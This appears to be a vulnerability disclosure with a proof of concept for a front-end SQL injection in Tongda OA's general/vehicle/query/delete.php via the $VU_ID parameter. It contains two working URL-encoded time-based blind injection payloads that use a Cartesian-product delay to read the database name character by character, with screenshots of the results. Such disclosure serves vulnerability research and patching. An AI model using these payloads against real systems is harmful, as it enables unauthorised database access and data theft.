Tongda OA has a front-end SQL injection vulnerability

1.
Route: general/vehicle/query/delete.php

There are injected parameters: $VU_ID

The code here is very concise. When $VU_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/xiatiandeyu123/cve/assets/153425025/2d607660-1c9b-4006-ac32-77946216e19b)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/xiatiandeyu123/cve/assets/153425025/b344d748-f11c-445e-97d9-31c05b065190)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

POC
```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/xiatiandeyu123/cve/assets/153425025/8c42e771-be57-487c-a51d-a126bace3c55)

The third digit is the character _
![image](https://github.com/xiatiandeyu123/cve/assets/153425025/5c82d37f-4b42-4234-a941-3dcd025393d0)

The fourth digit is the character o

![image](https://github.com/xiatiandeyu123/cve/assets/153425025/032600c1-2f7c-4a0f-96a4-5629660ae343)

The fifth digit is the character a

![image](https://github.com/xiatiandeyu123/cve/assets/153425025/d7c59d34-e29c-4401-a248-d0fe236deb21)
